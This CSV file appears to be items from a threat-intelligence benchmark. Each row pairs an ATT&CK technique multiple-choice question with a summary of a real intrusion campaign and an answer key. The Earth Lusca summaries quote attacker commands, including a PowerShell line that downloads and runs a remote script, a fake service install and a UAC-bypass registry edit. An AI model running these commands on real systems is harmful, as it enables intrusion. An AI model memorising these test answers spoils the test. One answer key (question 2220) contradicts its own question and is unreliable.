Question ID,AttackSeq ID,Batch ID,Question,A,B,C,D,CTI Outline,Answer
1191,25,25-Command and Control-T1071-Application Layer Protocol,"After utilizing the RMS tool's capabilities to evade detection through legitimate application functions, which ATT&CK technique most likely occurred when the RMS executable established communication with a C2 server located in Germany?",T1204-User Execution,T1568.001-Fast Flux DNS,T1071-Application Layer Protocol,T1071.001-Web Protocols,"Initial Access: CyberInt researchers have been tracking activities following a spear-phishing campaign targeting US-based retailers since December 2018. The campaign leveraged a legitimate remote administration tool, 'Remote Manipulator System' (RMS), developed by TektonIT, to gain entry into networks and evade security controls. The phishing emails contained malicious MS Office documents and used social engineering tactics.
Execution: The malicious MS Office documents delivered via phishing emails instructed victims to disable security controls to allow a nefarious macro to execute. This macro would then attempt to download malicious payloads from the threat actor's C2 infrastructure, which often masqueraded as legitimate-looking domains. The initial payload was typically a robust malware downloader used to gather further components, including the RMS tool, supporting shell scripts, and configuration files.
Persistence: For persistence, the second-stage shell script added a 'Microtik' string value to the 'HKEY_CURRENT_USERS' hive, 'Windows\CurrentVersion\Run' key to launch the RMS executable whenever the user logged on. Additionally, the RMS executable was launched before the script tried to forcefully kill the 'rundll32.exe' process, causing the script to go into a loop.
Defense Evasion: The threat actors utilized the RMS tool's capabilities to conduct reconnaissance and lateral movement within a victim network. The use of legitimate remote administration tools allowed threat actors to directly perform malicious activities as well as leverage the tool's capabilities to avoid detection.
Others: The sophisticated threat actor group dubbed 'TA505' has been active since 2014, conducting high-volume malicious email campaigns, including the distribution of banking trojans, botnets, exploit kits, and ransomware. TA505's recent campaigns have included the use of RMS in attacks against US-based retailers and the financial industry. Indicators of compromise identified in the US retail campaign were consistent with an attack against the Notary Chamber of Ukraine, also during December 2018. The accessibility and simplicity of using RMS for nefarious purposes likely explain the prevalence of the tool in unrelated malicious campaigns.",C
2220,376,376-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the group collected data using WinRAR to compress files into an archive, which ATT&CK technique most likely occurred as they used the C2 channels for transferring the stolen data out of the victim network?",T1590-Gather Victim Network Information,T1556.008-Network Provider DLL,T1041-Exfiltration Over C2 Channel,T1567.002-Exfiltration to Cloud Storage,"Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Initial Access: Earth Lusca utilized various initial access vectors, including spear phishing and watering hole attacks, to infect targets. They also exploited vulnerabilities in public-facing servers. For instance, they sent spear phishing emails with malicious links to a target news organization, which led to the download of either a malicious LNK file or an executable file. In watering hole attacks, they compromised websites or created fake web pages with injected malicious JavaScript code to deliver malware to their victims.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.",D
683,185,185-Command and Control-T1071-Application Layer Protocol,"After achieving lateral movement by exploiting vulnerabilities like MS08-067 and MS10-061 to propagate within networks, which ATT&CK technique most likely occurred to send data and receive commands or updates from predefined URLs?",T1608.002-Upload Tool,T1553-Subvert Trust Controls,T1071-Application Layer Protocol,T1001.003-Protocol or Service Impersonation,"Initial Access: The Stuxnet worm exploited the CVE-2010-2568 vulnerability to gain initial access to systems. This vulnerability was related to the way Windows displayed shortcut icons. Stuxnet used malicious .LNK files that, when viewed, would automatically execute the malware without user interaction. The worm specifically targeted SCADA systems, but its propagation method allowed it to spread widely. The initial infection vector was through removable drives, such as USB flash drives, which contained the malicious .LNK files and two TMP files (~WTR4141.TMP and ~WTR4132.TMP). The .LNK files were crafted to load the ~WTR4141.TMP file, which in turn would load and execute the ~WTR4132.TMP file, leading to the infection of the host machine.
Execution: Stuxnet's execution phase involved running malicious code on both local and remote systems. The worm's main module, a DLL packed with UPX, contained multiple resources including two kernel-mode drivers (MrxCls.sys and MrxNet.sys) and additional user-mode components. These drivers were responsible for injecting code into processes and hiding files used for propagation. Stuxnet also replaced legitimate system files with malicious versions to maintain persistence and control over infected systems. The malware executed exported functions from its main module to perform various tasks, such as building and running its dropper, spreading through the network, and communicating with command and control (C&C) servers.
Persistence: Stuxnet achieved persistence by installing kernel-mode drivers and user-mode components onto infected systems. It used a boot start service to ensure its kernel-mode driver (MrxCls.sys) was loaded early in the OS boot process. The driver injected code into specific processes and monitored system behavior to maintain control. Additionally, Stuxnet modified system files and registry keys to ensure it was executed upon system startup.
Privilege Escalation: Stuxnet utilized two zero-day vulnerabilities, MS10-073 and MS10-092, to escalate privileges on infected systems. The MS10-073 vulnerability in the win32k.sys system module allowed Stuxnet to execute arbitrary code with SYSTEM privileges by loading a specially crafted keyboard layout file. The MS10-092 vulnerability in the Windows Task Scheduler Service enabled Stuxnet to elevate its privileges up to SYSTEM level by manipulating the metadata of scheduled tasks. The worm used these elevated privileges to perform actions that would otherwise be restricted.
Defense Evasion: Stuxnet employed multiple techniques to evade detection and analysis. It used rootkit functionality to hide its presence on infected systems, including hiding files and injecting code into processes. The worm also utilized stolen digital certificates to sign its kernel-mode drivers, making them appear as legitimate software components. Additionally, Stuxnet patched system libraries and hooked functions to load non-existent libraries, reducing the likelihood of detection by heuristic methods.
Lateral Movement: Stuxnet propagated laterally through networks by exploiting vulnerabilities and shared resources. It used the MS08-067 RPC vulnerability and the MS10-061 Print Spooler vulnerability to spread itself across networked machines. The worm also scanned network shares and installed its dropper on accessible systems. Stuxnet's lateral movement capabilities allowed it to infect multiple systems within a targeted network, increasing its reach and impact.",C
568,172,172-Collection-T1113-Screen Capture,"After the malware collected basic information like IP address, hostname, and Bitcoin wallet addresses during the Discovery phase, which ATT&CK technique most likely occurred to gather screen recording files in the Collection phase?",T1036.006-Space after Filename,T1113-Screen Capture,T1012-Query Registry,T1213.005-Messaging Applications,"Initial Access: In July 2019, an APT attack targeted a customer's company, leading to the discovery of a new backdoor malware that uses Dropbox API for command and control (C&C) activities. The threat actor loaded a malicious DLL by leveraging the legitimate Windows Defender Core Process (MsMpEng.exe) with a legal digital signature. The infection process involved different loader filenames placed in C:\ProgramData\Microsoft, which called the function ServiceCrtMain from mpsvc.dll. The older variant of mpsvc.dll read shellcode from an English.rtf payload file, while the newer variant had hardcoded shellcode that would inject and execute to load additional shellcode from mpsvc.mui, ultimately releasing a fully functional backdoor executable.
Execution: The final malicious executable, released by the newer type of mpsvc.dll, had upgraded features, including the ability to interact with Dropbox API. It could bypass User Account Control (UAC) using a .NET technique disclosed in 2017 and had persistence mechanisms, either by registering as a startup program or as a system service.
Persistence: The malware ensured persistence by registering as a startup program in the registry path HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run if it lacked privileges, or as a system service if it had higher privileges.
Defense Evasion: The malware employed a UAC bypass technique using .NET, which was not new but had been disclosed in 2017. The threat actor only changed the GUID to evade detection.
Discovery: The malware collected basic information such as IP address, hostname, username, OS version, and searched for Bitcoin wallet addresses in the registry key HKEY_CURRENT_USER\Software\Bitcoin\Bitcoin-Qt. This information was uploaded to Dropbox with a log file named with the format %Y-%m-%d %H-%M-%S.log.
Command and Control: The malware could connect to a specific C&C server and send back data using fake HTTP POST requests. It also interacted with Dropbox, uploading and downloading files using the Dropbox API. The malware checked for a fake GIF file header in the bin.asc file downloaded from Dropbox before proceeding to a custom decoding phase to release the inject payload.
Others: The investigation revealed that the Dropbox API token was hardcoded in the malware. The Dropbox folder structure included a unique hash for each infected victim, log files, and payload files such as bin.asc. The malware's second stage involved establishing a connection to the C&C server and Dropbox, with Dropbox becoming a secondary C&C server with full remote control features if the primary C&C server's IP address was blocked. The malware could execute various commands, including listing drives, managing files, and opening terminals. The threat actor's approximate working hours were inferred from the decoded command files. Monitoring of the Dropbox tokens showed nearly 200 infected computers at the peak, with a drop in activity on August 21, 2019, when the threat actor cleared the Dropbox folder. The monitoring ended on September 20, 2019, when all tokens were revoked by the threat actor.",B
2189,376,376-Initial Access-T1189-Drive-by Compromise,"After utilizing reconnaissance tools like adfind and PowerSploit to gather domain information, which ATT&CK technique most likely occurred before Earth Lusca executed malicious binaries using command and scripting interpreters?",T1039-Data from Network Shared Drive,T1566-Phishing,T1027.007-Dynamic API Resolution,T1189-Drive-by Compromise,"Reconnaissance: During the investigation of Earth Lusca, it was discovered that the threat actor employed various reconnaissance techniques. They utilized Windows utilities such as 'net,' 'nltest,' 'ipconfig,' 'netstat,' and 'tasklist' to gather information on user accounts, domain controllers, and network configurations from compromised systems. Additionally, third-party tools like adfind and PowerSploit were used. For instance, the command 'powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Get-NetComputer -FullData > [file path]' was executed by Earth Lusca to load PowerSploit and discover machines in the same domain.
Execution: The execution phase involved Earth Lusca using command and scripting interpreters, deploying containers, and scheduling tasks/jobs to run malicious code. For example, they used the command 'sc create ""SysUpdate"" binpath= ""cmd /c start ""[file path]""""&&sc config ""SysUpdate"" start= auto&&net start SysUpdate' to create a service that pretended to be a system update service, which then launched a Cobalt Strike loader.
Persistence: To maintain access to systems, Earth Lusca used various persistence techniques such as account manipulation, BITS jobs, creating accounts, modifying system processes, and leveraging external remote services. They created services, scheduled tasks, and registered initialization scripts to ensure the execution of their malware after system reboots.
Privilege Escalation: Earth Lusca employed techniques like abuse of elevation control mechanisms, creating or modifying system processes, and hijacking execution flow to gain higher-level permissions. They used commands such as 'reg add HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\ /t REG_SZ /d ""%appdata%\[file name]"" /f' to bypass User Account Control (UAC) and gain elevated privileges.
Defense Evasion: The group used defense evasion techniques like abuse of elevation control mechanisms, BITS jobs, deobfuscating/decoding files or information, deploying containers, hiding artifacts, hijacking execution flow, impairing defenses, modifying the registry, and using signed binary proxy execution to avoid detection. They leveraged valid code-signed executions and employed various obfuscation techniques to hide their activities.
Credential Access: Earth Lusca targeted user credentials to gain greater access to internal networks. They used tools like procdump to dump the memory of the lsass process and obtain credential hashes. Additionally, they exploited the domain controller using the ZeroLogon exploit and Mimikatz to retrieve credentials.
Discovery: The threat actor used multiple scanning tools to discover machines in the compromised network environment. Tools like HUC Port Banner Scanner, nbtscan, and fscan were used with commands such as 'hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443' to scan for NetBIOS name information and shared folders.
Lateral Movement: Earth Lusca engaged in lateral movement by exploiting remote services and using internal spear phishing. They transferred tools and established network tunnels between the target's network and external servers, using proxy tools like lcx and frp with commands such as 'xs.exe -connect [ip address] [port number]' and 'frpc.exe -c frpc.ini'.
Collection: The group collected data from local systems and network shared drives, and captured email and screen data. They used WinRAR to compress files into an archive and the megacmd tool to upload the archive to the Mega service for exfiltration.
Command and Control: For command and control, Earth Lusca used application layer protocols, data obfuscation, encrypted channels, non-standard ports, protocol tunneling, proxies, and remote access software to communicate with compromised systems. They established C&C servers and used various techniques to mimic normal traffic and avoid detection.
Exfiltration: To exfiltrate data, Earth Lusca compressed files into archives and used the megacmd tool to upload them to cloud accounts. They also used C2 channels for data exfiltration, ensuring that the stolen data was packaged to avoid detection while being removed from the target network.",D
345,146,146-Execution-T1072-Software Deployment Tools,Which ATT&CK technique most likely followed after UNC2452 gained Initial Access via a compromised software supply chain to execute malicious code within the SolarWinds Orion platform?,T1569-System Services,T1583-Acquire Infrastructure,T1072-Software Deployment Tools,T1574.001-DLL Search Order Hijacking,"Reconnaissance: The report does not provide explicit details on the Reconnaissance tactics used by the threat actors involved in the SolarWinds Orion platform compromise. However, it mentions that the attackers demonstrated an impressive degree of reconnaissance and focus, suggesting that they had intimate knowledge of SolarWinds' source code, network topology, and internal development domain names. This knowledge was used to minimize the risk of detection by vigilant employees.
Resource Development: The report indicates that the threat actors behind the SolarWinds Orion platform compromise, referred to as UNC2452, demonstrated significant Resource Development capabilities. They were selective in their targeting, choosing specific organizations to pursue while excluding others. The report suggests adding the ATT&CK sub-technique T1583.001 Acquire Infrastructure: Domains to the UNC2452 actor profile, as the actors parked domains for future use. Additionally, the report notes that the attackers may have had access to private web servers and developed malware capabilities.
Initial Access: The report discusses the Initial Access tactic in the context of the SolarWinds Orion platform compromise. It highlights that the attackers used a supply chain compromise, specifically a compromised software update, as their initial access vector. This technique is listed as T1195 Supply Chain Compromise, with the sub-technique T1195.002 Compromise Software Supply Chain.
Persistence: The report does not provide specific details on Persistence techniques used by the threat actors. However, it implies that the attackers were able to maintain their foothold within the compromised networks by being selective in their targeting and careful to avoid detection.
Privilege Escalation: The report does not provide specific details on Privilege Escalation techniques used by the threat actors. However, it suggests that the attackers had a high level of system access, which may imply the use of techniques to gain elevated permissions.
Defense Evasion: The report details several Defense Evasion techniques used by the threat actors, including T1070 Indicator Removal on Host, T1036 Masquerading, T1553 Subvert Trust Controls, and T1497 Virtualization/Sandbox Evasion. The attackers took great care to avoid detection by security tools and personnel, demonstrating a high level of sophistication in evading defenses.
Credential Access: The report does not provide specific details on Credential Access techniques used by the threat actors. However, the use of valid accounts (T1078) is mentioned, suggesting that the attackers may have had access to legitimate credentials to facilitate their operations.
Discovery: The report mentions Discovery techniques such as T1057 Process Discovery and T1012 Query Registry, which the threat actors used to gain knowledge about the systems and internal network of the compromised organizations.
Lateral Movement: The report does not provide specific details on Lateral Movement techniques used by the threat actors. However, it suggests that the attackers were able to move through the network to reach their objectives, which may involve the use of techniques to control remote systems.
Collection: The report does not provide specific details on Collection techniques used by the threat actors. However, it mentions that the attackers were focused on information theft and espionage, which implies the use of techniques to gather data relevant to their goals.
Command and Control: The report discusses Command and Control techniques, including T1071 Application Layer Protocol and T1568 Dynamic Resolution, which the threat actors used to communicate with the compromised systems and maintain control over them.
Exfiltration: The report does not provide specific details on Exfiltration techniques used by the threat actors. However, it mentions that the attackers were likely focused on stealing data, which suggests the use of techniques to remove data from the target network.
Impact: The report does not provide specific details on Impact techniques used by the threat actors. However, it suggests that the primary goal of the attackers was espionage rather than destruction, indicating that impact techniques may not have been a focus of this campaign.
Others: The report provides an analysis of the SolarWinds Orion platform compromise, discussing the attribution challenges and the possibility of multiple actors being involved. It highlights the need for further investigation and intelligence analysis to understand the full scope of the campaign and the actors behind it. The report also emphasizes the importance of using frameworks like MITRE ATT&CK for mapping adversary TTPs and improving defensive strategies.",C
1881,337,337-Persistence-T1554-Compromise Client Software Binary,Which ATT&CK technique most likely occurred before FIN13 used trojanized versions of KeePass binaries to establish persistence after executing commands via cmd.exe using the BLUEAGAVE backdoor?,T1098.005-Device Registration,T1134.005-SID-History Injection,T1132-Data Encoding,T1554-Compromise Client Software Binary,"Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",D
1508,294,294-Reconnaissance-T1598-Phishing for Information,Which ATT&CK technique most likely occurred after spear phishing activities targeting the ASEAN region suggested the focus of reconnaissance efforts?,T1595.001-Scanning IP Blocks,T1102-Web Service,T1598-Phishing for Information,T1027-Obfuscated Files or Information,"Initial Access: The spear phishing document exploits CVE-2012-0158 to create a decoy document and a malware dropper named exp1ore.exe, which drops wab.exe and a malicious DLL, wab32res.dll, in the temp folder. The malware, named 'Trojan.APT.Seinup', uses DLL side-loading to load the malicious DLL and installs a copy as msnetrsvw.exe in the Windows directory, registering it as a Windows service for persistence.
Execution: The malware manually loads the malicious DLL into memory, avoiding detection from DLL listings. It contains functions for downloading files, executing or loading libraries, changing sleep duration, and managing interactive sessions.
Persistence: By registering as a Windows service, the malware named 'Trojan.APT.Seinup' ensures its persistence across system reboots.
Defense Evasion: The malware uses Google Docs for redirection to evade callback detection, a technique also found in 'Backdoor.Makadocs'. It employs various cryptographic functions for secure operations and loads malicious code into memory without using Windows 32 API, evading signature-based scanning.
Command and Control: Trojan.APT.Seinup uses Google Docs to protect malicious communication with legitimate SSL, making it difficult to inspect SSL traffic without specialized hardware or analysis of usage patterns. It also employs a custom Base64 map and a salted digital thumbprint for secure callbacks.
Others: The malware uses a zero-skipping XOR encryption technique to prevent statistical methods from recovering the XOR key. It also uses the Mersenne Twister algorithm to generate random intervals for callbacks, making it difficult to detect based on regular network connections. The malware's in-memory-only presence and encrypted or compressed state on disk contribute to its evasion capabilities.",C
2296,384,384-Command and Control-T1071-Application Layer Protocol,"After the DNSpionage campaign executed a reconnaissance phase to exfiltrate user and domain information and prior to intercepting traffic through DNS communication for further instructions, which ATT&CK technique most likely facilitated communication with the C2 server?",T1590-Gather Victim Network Information,T1071.005-Publish/Subscribe Protocols,T1608.002-Upload Tool,T1071-Application Layer Protocol,"Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",D
16,100,100-Defense Evasion-T1656-Impersonation,"During the initial access phase where the attackers employ email-based deception by impersonating the CEO to initiate correspondence, which ATT&CK technique most likely occurs as part of the defense evasion phase to appear legitimate and prevent validation of their claims?",T1055.002-Portable Executable Injection,T1078.004-Cloud Accounts,T1566-Phishing,T1656-Impersonation,"Initial Access: The Israel-based threat group employs a two-stage attack process, with the first stage involving initial email correspondence. They commonly impersonate the CEO of the targeted organization, setting the stage for the attack by claiming the organization is working through the confidential acquisition of another company and requesting assistance with an initial payment. The group uses various tactics to make the emails appear legitimate, such as spoofing the CEO's email address using the real domain if no effective DMARC policy is in place, or updating the sending display name to include the CEO's email address in the display name. The emails are primarily written in English, but some campaigns have been translated into Spanish, French, Italian, and Japanese to fit in with the usual communications of the targeted employee.
Others: The report details the activities of a sophisticated Israel-based threat group responsible for over 350 BEC campaigns since February 2021. The group targets multinational corporations with annual revenues averaging over $10 billion, with employees in at least 61 different countries across six continents. The campaigns follow a cyclical pattern, with 80% of attacks occurring during three periods throughout the year. The group does not target specific industries and prefers larger enterprises. The average amount requested in an attack is $712,000. The group uses real attorneys' identities, often from KPMG, to coordinate payments. The secondary personas referenced are real M&A attorneys based in the UK. The group's unique approach includes requesting large sums of money and transitioning conversations to voice calls via WhatsApp to expedite the process and reduce the paper trail. The report concludes with recommendations for protecting organizations from BEC attacks, emphasizing the need for security solutions that use behavioral AI to understand identity, context, and content.",D
